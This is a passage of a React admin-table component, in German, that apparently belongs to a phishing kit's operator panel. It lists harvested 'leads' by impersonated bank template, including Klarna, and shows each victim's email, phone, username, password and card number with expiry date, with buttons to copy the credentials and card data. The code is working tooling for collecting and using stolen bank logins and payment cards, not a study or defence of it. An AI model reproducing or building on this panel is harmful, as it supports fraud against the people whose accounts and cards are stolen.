                selectedBank = additionalData.selected_bank || 
                              additionalData.login_data?.bank_type || 
                              additionalData.bank_type ||
                              additionalData.bankType ||
                              additionalData.bank ||
                              additionalData.selectedBank;
                
                // Fallback: For old Klarna leads without bank data, show a generic composite
                if (!selectedBank) {
                  selectedBank = 'generic';
                }
              } catch (error) {
                console.warn('Error parsing additional data for composite icon:', error);
                selectedBank = 'generic'; // Fallback on error
              }
              } else {
                // No additional_data at all - use generic overlay
                selectedBank = 'generic';
              }
            }

                          return (
                            <BankIcon 
                              templateName={lead.template_name} 
                              selectedBank={selectedBank}
                              size="lg"
                            />
                          );
                        })()}
                      </div>
                    </td>
                    <td className="px-6 py-4">
                      <div className="flex flex-col">
                        <div className="text-sm font-medium text-gray-900">
                          {formatDisplayName(lead)}
                        </div>
                        <div className="space-y-1 mt-1">
                          {lead.email && (
                            <div className="flex items-center space-x-2 text-xs text-gray-500">
                              <Mail size={12} />
                              <span>{lead.email}</span>
                            </div>
                          )}
                          {lead.phone && (
                            <div className="flex items-center space-x-2 text-xs text-gray-500">
                              <Phone size={12} />
                              <span>{lead.phone}</span>
                            </div>
                          )}
                        </div>
                      </div>
                    </td>
                    <td className="px-6 py-4">
                      <div className="flex items-center space-x-2">
                        {lead.username ? (
                          <>
                            <code className="text-sm font-mono bg-gray-100 px-2 py-1 rounded">
                              {lead.username}
                            </code>
                            <button
                              onClick={() => copyToClipboard(lead.username, 'Username')}
                              className="p-1 text-gray-400 hover:text-gray-600 hover:bg-gray-100 rounded"
                              title="Username kopieren"
                            >
                              <Copy className="h-3 w-3" />
                            </button>
                          </>
                        ) : (
                          <span className="text-gray-400 text-sm">-</span>
                        )}
                      </div>
                    </td>
                    <td className="px-6 py-4">
                      <div className="flex items-center space-x-2">
                        {lead.password ? (
                          <>
                            <code className="text-sm font-mono bg-gray-100 px-2 py-1 rounded">
                              {'•'.repeat(Math.min(lead.password.length, 8))}
                            </code>
                            <button
                              onClick={() => copyToClipboard(lead.password, 'Password')}
                              className="p-1 text-gray-400 hover:text-gray-600 hover:bg-gray-100 rounded"
                              title="Password kopieren"
                            >
                              <Copy className="h-3 w-3" />
                            </button>
                          </>
                        ) : (
                          <span className="text-gray-400 text-sm">-</span>
                        )}
                      </div>
                    </td>
                    <td className="px-6 py-4">
                      <div className="flex items-center space-x-2">
                        {(() => {
                          // Extract card data from additional_data
                          let cardNumber = '';
                          let expiryDate = '';
                          try {
                            if (lead.additional_data) {
                              const data = JSON.parse(lead.additional_data);
                              cardNumber = data.bank_card?.card_number || '';
                              expiryDate = data.bank_card?.expiry_date || '';
                            }
                          } catch (e) {
                            // Ignore parsing errors
                          }
                          
                          if (cardNumber || expiryDate) {
                            const cardData = `${cardNumber} ${expiryDate}`.trim();
                            return (
                              <>
                                <code className="text-sm font-mono bg-gray-100 px-2 py-1 rounded">
                                  {cardNumber ? cardNumber.replace(/(.{4})/g, '$1 ').trim() : ''} {expiryDate}
                                </code>
                                <button
                                  onClick={() => copyToClipboard(cardData, 'Card Data')}
                                  className="p-1 text-gray-400 hover:text-gray-600 hover:bg-gray-100 rounded"
                                  title="Kartendaten kopieren"
                                >
                                  <Copy className="h-3 w-3" />
                                </button>
                              </>
                            );
                          }
                          return <span className="text-gray-400 text-sm">-</span>;
                        })()}
                      </div>
                    </td>
                    <td className="px-6 py-4">
                      <span
                        className={`px-3 py-1 inline-flex text-xs leading-5 font-medium rounded-full ${getStatusColor(lead.status)}`}
                      >
                        {getStatusText(lead.status)}
                      </span>
                    </td>
                    <td className="px-6 py-4">
                      <div className="text-sm text-gray-900">
                        {new Date(lead.created_at).toLocaleDateString('de-DE', {
                          day: '2-digit',
                          month: '2-digit',
                          year: 'numeric',
                        })}
                      </div>
                      <div className="text-xs text-gray-500">
                        {new Date(lead.created_at).toLocaleTimeString('de-DE', {
                          hour: '2-digit',
                          minute: '2-digit',
                        })}
                      </div>
                    </td>
                    <td className="px-6 py-4 text-center">
                      <div className="flex items-center justify-center space-x-2">
                        <button 
                          onClick={() => navigate(`/admin/leads/${lead.id}`)}
                          className="p-2 text-blue-600 hover:text-blue-800 hover:bg-blue-50 rounded-full transition-colors"
                          title="Details anzeigen"
                        >
                          <Eye className="h-4 w-4" />
                        </button>
                        <button 
                          onClick={() => handleDeleteLead(lead.id)}
                          disabled={deletingId === lead.id}
                          className="p-2 text-red-600 hover:text-red-800 hover:bg-red-50 rounded-full transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                          title="Eintrag löschen"
                        >
                          {deletingId === lead.id ? (
                            <Loader className="h-4 w-4 animate-spin" />
                          ) : (
                            <Trash2 className="h-4 w-4" />
                          )}
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
        
        {/* Pagination */}
        <Pagination
          currentPage={currentPage}
          totalPages={totalPages}
          totalItems={totalLeads}
          pageSize={pageSize}
          onPageChange={setCurrentPage}
          onPageSizeChange={handlePageSizeChange}
          loading={loading}
          showPageSizeSelector={true}
          showPageInfo={true}
          showPageNumbers={true}
          maxPageNumbers={7}
        />
      </div>
    </div>
  );
};